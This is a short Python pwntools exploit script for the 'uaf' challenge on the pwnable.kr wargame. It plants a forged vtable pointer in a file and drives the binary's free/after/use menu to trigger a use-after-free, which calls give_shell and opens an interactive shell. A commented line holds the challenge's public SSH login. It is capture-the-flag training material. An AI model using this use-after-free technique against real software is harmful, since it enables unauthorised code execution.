from pwn import *
context.bits = 64

#s = ssh(host='pwnable.kr',user='uaf',password='guest',port=2222)

payload = open('imp','w')

give_shell = 0x401172
shell_ptr = 0x401550 # man object  

addr = pack(shell_ptr-8)

payload.write(addr)

payload.close()

p = process(['./uaf','20','imp'])

msg = p.recvlines(3)
print msg 

p.sendline('3') # free

msg = p.recvlines(3)
print msg

p.sendline('2') # after 

msg = p.recvlines(4)
print msg

p.sendline('2') # after 

msg = p.recvlines(4)
print msg

p.sendline('1') # use

p.interactive()


